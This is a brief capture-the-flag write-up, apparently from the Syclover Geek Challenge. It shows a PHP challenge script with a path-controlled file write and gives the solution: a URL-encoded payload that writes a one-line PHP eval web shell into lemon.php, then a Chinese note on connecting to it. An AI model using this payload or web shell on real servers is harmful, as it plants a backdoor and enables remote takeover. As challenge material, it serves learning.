# Challenge
```php 
<?php
if(isset($_GET) && !empty($_GET)){
    $url = $_GET['file'];
    $path = 'upload/'.$_GET['path'];
}else{
    show_source(__FILE__);
    exit();
}
 
if(strpos($path,'..') > -1){
    die('SYCwaf!');
}
 
if(strpos($url,'http://127.0.0.1/') === 0){
    file_put_contents($path, file_get_contents($url));
    echo "console.log($path update successed!)";
}else{
    echo "Hello.Geeker";
}
```

# Solution

payload

```
?path=lemon.php&file=http%3A%2f%2f127.0.0.1%2fphp_challenge%2f31.php%3Fpath%3D%253C%253Fphp%2520@eval%2528%2524_POST%255Bx%255D%2529%253B%253F%253E%26file%3Dhttp%3A%2f%2f127.0.0.1%2fphp_challenge%2f31.php
```

注入一句话，访问 /uploads/lemon.php 连接

# Refference
+ [第七季极客大挑战writeup | Syclover Team](http://blog.sycsec.com/?p=894)

https://blog.spoock.com/2016/11/14/sycsec-writeup/